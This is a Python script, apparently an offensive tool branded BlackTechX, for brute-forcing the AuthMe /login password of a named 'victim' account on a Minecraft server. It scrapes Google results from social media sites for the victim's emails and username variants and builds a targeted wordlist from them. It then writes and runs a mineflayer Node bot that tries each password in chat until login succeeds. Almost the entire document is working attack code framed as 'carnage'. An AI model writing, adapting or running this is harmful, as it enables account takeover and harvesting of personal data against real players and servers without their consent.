#!/data/data/com.termux/files/usr/bin/env python3
# AUTHMEBRUTEFORCE.py  –  BlackTechX  –  200+ lines of AuthMe carnage
import os,sys,time,re,json,requests,subprocess,random,string
from colorama import Fore,init
init(autoreset=True)

LOGO=r"""
██████╗ ██╗   ██╗██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ ██████╗ ██╗  ██╗
██╔══██╗╚██╗ ██╔╝██║  ██║██║   ██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██║ ██╔╝
██████╔╝ ╚████╔╝ ███████║██║   ██║██████╔╝█████╗  ██████╔╝██████╔╝█████╔╝
██╔══██╗  ╚██╔╝  ██╔══██║██║   ██║██╔══██╗██╔══╝  ██╔══██╗██╔══██╗██╔═██╗
██████╔╝   ██║   ██║  ██║╚██████╔╝██████╔╝███████╗██║  ██║██║  ██║██║  ██╗
╚═════╝    ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
         WELCOME TO BRUTEMC  –  AuthMe /login slaughterhouse
"""
slowprint=lambda txt,d=0.002:[(sys.stdout.write(c),sys.stdout.flush(),time.sleep(d)) for c in txt]

# ---------- sanity checks ----------
def check_node_module():
    try:
        subprocess.run(["node","-e","require('mineflayer')"],check=True,capture_output=True)
    except subprocess.CalledProcessError:
        slowprint(f"{Fore.YELLOW}[*] mineflayer not found – installing...\n")
        subprocess.run(["npm","i","-g","mineflayer"],check=True)

# ---------- core engine ----------
class AuthBrute:
    def __init__(self,ip,user):
        self.ip_raw=ip
        self.user=user
        if ":" in ip:
            self.host,self.port=ip.split(":",1)
            self.port=int(self.port)
        else:
            self.host=ip
            self.port=25565
        self.wordlist="passwords.txt"
        self.confidence=0
        self.session=requests.Session()
        self.session.headers.update({"User-Agent":"Mozilla/5.0 (compatible; BRUTEMC/1.0)"})

    def banner(self):
        slowprint(Fore.RED+LOGO)
        print(f"{Fore.CYAN}[*] Target: {self.host}:{self.port}  |  Victim: {self.user}")

    def scrape_clues(self):
        slowprint(f"{Fore.YELLOW}[*] Scraping web for clues on {self.user}...\n")
        engines=[
            f"site:facebook.com '{self.user}' minecraft",
            f"site:instagram.com '{self.user}'",
            f"site:twitter.com '{self.user}' minecraft",
            f"site:tiktok.com '{self.user}'",
            f"site:reddit.com '{self.user}' minecraft"
        ]
        leaks=[]
        for q in engines:
            try:
                r=self.session.get("https://www.google.com/search",params={"q":q},timeout=8)
                leaks+=re.findall(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})',r.text)
                leaks+=re.findall(r'('+re.escape(self.user)+r'\d{0,4})',r.text)
            except:pass
        years=[str(y) for y in range(2010,2026)]
        suffixes=["123","1234","12345","!","@","#","$","%","&","*","minecraft","mc"]
        clues=[self.user]+[e.split("@")[0] for e in leaks]+leaks
        for base in clues[:40]:
            for suf in suffixes:
                clues.append(base+suf)
                for y in years:
                    clues.append(base+y)
        return list(set(clues))[:1000]

    def generate_wordlist(self):
        if os.path.isfile(self.wordlist):
            slowprint(f"{Fore.GREEN}[+] Using existing {self.wordlist}\n")
            return
        slowprint(f"{Fore.YELLOW}[*] Generating mega wordlist...\n")
        base=self.scrape_clues()
        pet=["shadow","lucky","max","bella","rocky","steve","alex","coco","mia","java"]
        months=["jan","feb","mar","apr","may","jun","jul","aug","sep","oct","nov","dec"]
        specials=["!","@","#","$","%","&","*","123","1234","12345","2020","2021","2022","2023","2024","2025"]
        full=base+pet+months
        mega=[]
        for w in full:
            for s in specials:
                mega.append(w+s)
                mega.append(w.capitalize()+s)
                mega.append(w.upper()+s)
        common=["password","123456","12345678","qwerty","abc123","123456789","password123","admin","letmein","welcome","login","minecraft"]
        mega+=common
        random.shuffle(mega)
        with open(self.wordlist,"w",encoding="utf-8") as f:
            f.write("\n".join(mega))
        slowprint(f"{Fore.GREEN}[+] Generated {len(mega)} passwords -> {self.wordlist}\n")

    def brute(self):
        self.generate_wordlist()
        slowprint(f"{Fore.RED}[*] Brute-force started – node engine\n")
        scr=f"""
const mineflayer=require('mineflayer');
const fs=require('fs');
const user='{self.user}';
const host='{self.host}';
const port={self.port};
const passwords=fs.readFileSync('{self.wordlist}','utf8').split('\\n').map(l=>l.trim()).filter(l=>l);
let idx=0;
let confidence=0;
const bot=mineflayer.createBot({{host,port,username:user}});
const tryNext=()=>{{
  if(idx>=passwords.length){{console.log('[!] Wordlist exhausted – confidence 0%');process.exit(0);}}
  const pwd=passwords[idx++];
  console.log(`[!] Trying ${{pwd}}`);
  bot.chat(`/login ${{pwd}}`);
}};
setInterval(tryNext,800);
bot.on('chat',(u,m)=>{{
  const msg=m.toLowerCase();
  if(msg.includes('successful')||msg.includes('logged in')||msg.includes('welcome back')){{
    console.log(`[SUCCESS] ${{passwords[idx-1]}} – confidence 100%`);confidence=100;process.exit(0);
  }}
  if(msg.includes('invalid')||msg.includes('wrong')){{confidence=0;}}
}};
bot.on('error',e=>console.log('[ERROR]',e));
"""
        with open("_brute.js","w") as f:
            f.write(scr)
        try:
            subprocess.run(["node","_brute.js"],check=True)
        except subprocess.CalledProcessError:
            slowprint(f"{Fore.RED}[!] Node crashed – likely wrong IP/port or server offline\n")
        os.remove("_brute.js")

def main():
    slowprint(Fore.RED+LOGO)
    check_node_module()
    ip=input(f"{Fore.CYAN}[?] Server IP (with or without port): ").strip()
    user=input(f"{Fore.CYAN}[?] Victim username: ").strip()
    if not ip or not user:
        print(f"{Fore.RED}[!] Empty input – fuck off.");sys.exit(1)
    AuthBrute(ip,user).brute()

if __name__=="__main__":
    try:main()
    except KeyboardInterrupt:
        print(f"{Fore.RED}\n[!] Aborted by user");sys.exit()
